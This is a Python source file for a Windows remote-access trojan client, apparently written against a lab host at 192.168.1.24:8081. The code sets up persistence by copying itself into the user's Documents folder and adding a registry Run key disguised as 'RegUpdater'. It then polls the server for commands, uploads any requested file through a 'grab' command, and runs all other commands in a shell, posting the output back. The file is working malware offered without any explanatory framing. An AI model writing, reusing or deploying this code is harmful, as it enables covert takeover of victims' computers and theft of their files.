import requests
import os
import subprocess
import time
import shutil
import winreg as wreg
import random

def connect():
    while True:
        # C:\Users\User\PycharmProjects\pythonProject
        path = os.getcwd().strip('/n')


        Null, userprof = subprocess.check_output('set USERPROFILE', shell=True, stdin=subprocess.PIPE,stderr=subprocess.PIPE).decode("utf-8","ignore").split('=')

        destination = userprof.strip('\n\r') + '\\Documents\\' + 'client.exe'

        if not os.path.exists(destination):
            shutil.copyfile(path + '\client.exe', destination)

            # change the path for register
            key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS)
            wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, destination)
            key.Close()

        while True:
            req = requests.get('http://192.168.1.24:8081')
            command = req.text
            if 'terminate' in command:
                return 1
            elif 'grab' in command:
                grab, path = command.split("*")
                if os.path.exists(path):
                    url = "http://192.168.1.24:8081/store"
                    files = {'file': open(path, 'rb')}
                    r = requests.post(url, files=files)
                else:
                    post_response = requests.post(url='http://192.168.1.24:8081',
                                                  data='[-] Not able to find the file!'.encode())
            else:
                CMD = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                       stderr=subprocess.PIPE)
                post_response = requests.post(url='http://192.168.1.24:8081', data=CMD.stdout.read())
                post_response = requests.post(url='http://192.168.1.24:8081', data=CMD.stderr.read())
            time.sleep(3)


while True:
    try:
        if connect() == 1:
            break
    except:
        sleep_for = random.randrange(1, 10)
        time.sleep(int(sleep_for))

        pass